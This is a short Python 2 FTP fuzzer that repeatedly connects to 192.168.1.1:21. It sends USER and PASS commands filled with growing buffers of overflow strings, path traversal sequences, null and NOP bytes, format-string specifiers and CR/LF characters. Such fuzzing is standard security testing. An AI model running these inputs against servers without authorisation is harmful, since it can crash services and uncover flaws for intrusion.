#!/usr/bin/python
 
#############################
# ftpfuzz.py
# 01/28/2013
# v1.0.0
#############################
 
#hex = %#X
 
import socket
from time import sleep
 
def create_buffer(x):
        counter = 2
        buffer = [x]
        while len(buffer) <= 40:
                buffer.append(x * counter)
                counter = counter + 100
        return buffer
 
tests=["A","../","\..","\\","\\0",1,hex(0),"\\xff","\\x00","\\x90","%s","%256s ","%p","%1p ","%d","%1d ","%x","%1x ","\\n","\\r"]
 
for val in tests:
        mybuffer = create_buffer(val)
        for buf in mybuffer:
                try:
                        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                        connect = s.connect(('192.168.1.1',21))
                        print s.recv(1024)
                        if isinstance(buf, str):
                                s.send(('USER %s\r\n') % buf)
                        elif isinstance(buf, int):
                                s.send(('USER %d\r\n') % buf)
                        else:
                                s.send(('USER %#x\r\n') % buf)
                        if isinstance(buf, str):
                                s.send(('PASS %s\r\n') % buf)
                        elif isinstance(buf, int):
                                s.send(('PASS %d\r\n') % buf)
                        else:
                                s.send(('PASS %#x\r\n') % buf)
 
                        print s.recv(1024)
                        s.send('QUIT\r\n')
                        s.close()
                        sleep(0.1)
 
                except socket.error, e:
                        print str(e).split(None,1)
